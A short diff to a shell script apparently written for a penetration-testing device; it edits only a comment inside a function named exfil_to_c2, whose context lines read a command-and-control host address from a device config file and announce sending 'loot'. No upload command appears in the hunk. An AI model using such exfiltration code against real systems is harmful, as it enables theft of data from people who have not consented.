@@ -68,7 +68,7 @@ exfil_to_c2() {
   ALERT "Sending loot\nto C2..." 1 false
   CREATE_SPINNER "Uploading..."
 
-  # Read C2 host from device config
+  # Read C2 host from device config ( probably should have used C2GETCONFIG here instead )
   C2_HOST=$(cat /etc/device.config | grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | head -1)
 
   # Fall back to localhost if parsing fails
